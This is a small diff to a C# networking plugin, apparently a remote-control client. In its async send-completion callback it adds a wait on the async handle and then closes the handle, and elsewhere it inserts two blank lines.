@@ -66,6 +66,7 @@ namespace Plugin
         public void EndConnect(IAsyncResult ar)
         {
             Connected = connectAsync.EndInvoke(ar);
+
             if (hasToExit)
             {
                 return;
@@ -148,6 +149,7 @@ namespace Plugin
         public void EndPacketRead(IAsyncResult ar)
         {
             IPacket packet = readPacketAsync.EndInvoke(ar);
+
             if (packet != null)
                 ParsePacket(packet);
         }
@@ -229,7 +231,10 @@ namespace Plugin
         }
         private void SendDataCompleted(IAsyncResult ar)
         {
+            ar.AsyncWaitHandle.WaitOne();
             PacketType packetType = sendDataAsync.EndInvoke(ar);
+            ar.AsyncWaitHandle.Close();
+
             if (Connected)
             {
                 if (packetType == PacketType.RC_GET_CAM)
